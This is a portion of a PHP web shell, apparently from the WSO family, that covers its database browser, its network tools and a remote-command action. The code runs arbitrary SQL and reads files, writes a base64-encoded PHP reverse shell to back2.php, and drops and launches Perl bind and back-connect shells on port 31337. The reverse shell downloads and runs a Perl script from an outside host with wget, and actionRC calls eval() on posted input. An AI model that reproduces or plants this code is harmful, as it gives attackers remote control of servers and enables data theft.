	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<select name=sql_base><option value=''></option>";
			while($item = $db->fetch()) {
				list($key, $value) = each($item);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "</td>
				<td><input type=submit value='>>'></td>
			</tr>
		</table>
		<script>
			function st(t,l) {
				document.sf.p1.value = 'select';
				document.sf.p2.value = t;
				if(l!=null)document.sf.p3.value = l;
				document.sf.submit();
			}
			function is() {
				for(i=0;i<document.sf.elements['tbl[]'].length;++i)
					document.sf.elements['tbl[]'][i].checked = !document.sf.elements['tbl[]'][i].checked;
			}
		</script>";
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;border-right:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($item = $db->fetch($tbls_res)) {
					list($key, $value) = each($item);
					$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."')\">".$value."</a> (".$n['n'].")</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
					$db->query('SELECT COUNT(*) as n FROM '.$_POST['p2'].'');
					$num = $db->fetch();
					$num = $num['n'];
					echo "<span>".$_POST['p2']."</span> ($num) ";
					for($i=0;$i<($num/30);$i++)
						if($i != (int)$_POST['p3'])
							echo "<a href='#' onclick='st(\"".$_POST['p2']."\", $i)'>",($i+1),"</a> ";
						else
							echo ($i+1)," ";
					if($_POST['type']=='pgsql')
						$_POST['p3'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p3'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {
					$db->query(@$_POST['p3']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=0 cellpadding=2 class=main>';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($item as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br><textarea name='p3' style='width:100%;height:100px'>".@htmlspecialchars($_POST['p3'])."</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/><form onsubmit='document.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db->loadFile($_POST['p2']);
				echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	}
	echo '</div>';
	wsoFooter();
}
function actionNetwork() {
	wsoHeader();
	echo '<tr><td><a href=/dkcgi/cgi.pl>cgi script 1</a><br></tr></form></table>';

$file = fopen($dir."back2.php" ,"w+");
$sa=base64_decode('X3NoZWxsX2F0aWxkaV8NCjw/cGhwIA0Kc2V0X3RpbWVfbGltaXQgKDApOw0KJFZFUlNJT04gPSAiMS4wIjsNCiRpcCA9IGdldGVudiAoJ1JFTU9URV9BRERSJyk7ICAvLyANCiRwb3J0ID0gNzA7ICAgICAgIC8vIENIQU5HRSBUSElTDQokY2h1bmtfc2l6ZSA9IDE0MDA7DQokd3JpdGVfYSA9IG51bGw7DQokZXJyb3JfYSA9IG51bGw7DQokc2hlbGwgPSAnY2QgL2Rldi9zaG07IHdnZXQgd3d3Lm5idmsubmwvdy8xMC50eHQ7IHBlcmwgMTAudHh0OyAvYmluL3NoIC1pJzsNCiRkYWVtb24gPSAwOw0KJGRlYnVnID0gMDsNCg0KLy8NCi8vIERhZW1vbmlzZSBvdXJzZWxmIGlmIHBvc3NpYmxlIHRvIGF2b2lkIHpvbWJpZXMgbGF0ZXINCi8vDQoNCi8vIHBjbnRsX2ZvcmsgaXMgaGFyZGx5IGV2ZXIgYXZhaWxhYmxlLCBidXQgd2lsbCBhbGxvdyB1cyB0byBkYWVtb25pc2UNCi8vIG91ciBwaHAgcHJvY2VzcyBhbmQgYXZvaWQgem9tYmllcy4gIFdvcnRoIGEgdHJ5Li4uDQppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsNCiAgIC8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQNCiAgICRwaWQgPSBwY250bF9mb3JrKCk7DQogICANCiAgIGlmICgkcGlkID09IC0xKSB7DQogICAgICBwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOw0KICAgICAgZXhpdCgxKTsNCiAgIH0NCiAgIA0KICAgaWYgKCRwaWQpIHsNCiAgICAgIGV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMNCiAgIH0NCg0KICAgLy8gTWFrZSB0aGUgY3VycmVudCBwcm9jZXNzIGEgc2Vzc2lvbiBsZWFkZXINCiAgIC8vIFdpbGwgb25seSBzdWNjZWVkIGlmIHdlIGZvcmtlZA0KICAgaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7DQogICAgICBwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsNCiAgICAgIGV4aXQoMSk7DQogICB9DQoNCiAgICRkYWVtb24gPSAxOw0KfSBlbHNlIHsNCiAgIHByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOw0KfQ0KDQovLyBDaGFuZ2UgdG8gYSBzYWZlIGRpcmVjdG9yeQ0KY2hkaXIoIi8iKTsNCg0KLy8gUmVtb3ZlIGFueSB1bWFzayB3ZSBpbmhlcml0ZWQNCnVtYXNrKDApOw0KDQovLw0KLy8gRG8gdGhlIHJldmVyc2Ugc2hlbGwuLi4NCi8vDQoNCi8vIE9wZW4gcmV2ZXJzZSBjb25uZWN0aW9uDQokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsNCmlmICghJHNvY2spIHsNCiAgIHByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsNCiAgIGV4aXQoMSk7DQp9DQoNCi8vIFNwYXduIHNoZWxsIHByb2Nlc3MNCiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KA0KICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20NCiAgIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvDQogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bw0KKTsNCg0KJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7DQplY2hvICRwcm9jZXNzOw0KaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsNCiAgIHByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOw0KICAgZXhpdCgxKTsNCn0NCg0KLy8gU2V0IGV2ZXJ5dGhpbmcgdG8gbm9uLWJsb2NraW5nDQovLyBSZWFzb246IE9jY3Npb25hbGx5IHJlYWRzIHdpbGwgYmxvY2ssIGV2ZW4gdGhvdWdoIHN0cmVhbV9zZWxlY3QgdGVsbHMgdXMgdGhleSB3b24ndA0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOw0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOw0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOw0Kc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7DQoNCnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsNCg0Kd2hpbGUgKDEpIHsNCiAgIC8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24NCiAgIGlmIChmZW9mKCRzb2NrKSkgew0KICAgICAgcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOw0KICAgICAgYnJlYWs7DQogICB9DQoNCiAgIC8vIENoZWNrIGZvciBlbmQgb2YgU1RET1VUDQogICBpZiAoZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICBwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7DQogICAgICBicmVhazsNCiAgIH0NCg0KICAgLy8gV2FpdCB1bnRpbCBhIGNvbW1hbmQgaXMgZW5kIGRvd24gJHNvY2ssIG9yIHNvbWUNCiAgIC8vIGNvbW1hbmQgb3V0cHV0IGlzIGF2YWlsYWJsZSBvbiBTVERPVVQgb3IgU1RERVJSDQogICAkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsNCiAgICRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOw0KDQogICAvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBUQ1Agc29ja2V0LCBzZW5kDQogICAvLyBkYXRhIHRvIHByb2Nlc3MncyBTVERJTg0KICAgaWYgKGluX2FycmF5KCRzb2NrLCAkcmVhZF9hKSkgew0KICAgICAgaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7DQogICAgICAkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOw0KICAgICAgaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSzogJGlucHV0Iik7DQogICAgICBmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOw0KICAgfQ0KDQogICAvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RET1VUDQogICAvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbg0KICAgaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsNCiAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7DQogICAgICAkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsNCiAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7DQogICAgICBmd3JpdGUoJHNvY2ssICRpbnB1dCk7DQogICB9DQoNCiAgIC8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERFUlINCiAgIC8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0aW9uDQogICBpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgew0KICAgICAgaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSIFJFQUQiKTsNCiAgICAgICRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOw0KICAgICAgaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsNCiAgICAgIGZ3cml0ZSgkc29jaywgJGlucHV0KTsNCiAgIH0NCn0NCg0KZmNsb3NlKCRzb2NrKTsNCmZjbG9zZSgkcGlwZXNbMF0pOw0KZmNsb3NlKCRwaXBlc1sxXSk7DQpmY2xvc2UoJHBpcGVzWzJdKTsNCnByb2NfY2xvc2UoJHByb2Nlc3MpOw0KDQovLyBMaWtlIHByaW50LCBidXQgZG9lcyBub3RoaW5nIGlmIHdlJ3ZlIGRhZW1vbmlzZWQgb3Vyc2VsZg0KLy8gKEkgY2FuJ3QgZmlndXJlIG91dCBob3cgdG8gcmVkaXJlY3QgU1RET1VUIGxpa2UgYSBwcm9wZXIgZGFlbW9uKQ0KZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgew0KICAgaWYgKCEkZGFlbW9uKSB7DQogICAgICBwcmludCAiJHN0cmluZ1xuIjsNCiAgIH0NCn0NCg0KPz4=');
$write = fwrite ($file ,$sa);
fclose($file);

	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
	<span>Bind port to /bin/sh [perl]</span><br/>
	Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form>
	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
	<span>Back-connect  [perl]</span><br/>
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
	</form><br><b><a href=/back2.php>Back-connect[php]</a></b><br>
	
	";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w=@fopen($f,"w") or @function_exists('file_put_contents');
			if($w)	{
				@fwrite($w,base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$out = wsoEx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
			echo "<pre class=ml1>$out
".wsoEx("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1>/dev/null 2>&1 &");
			echo "<pre class=ml1>$out
".wsoEx("ps aux | grep bc.pl")."</pre>";
		}
		
	
	}
	echo '</div>';
	wsoFooter();
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"wso_version" => VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}
if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('action' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
exit;

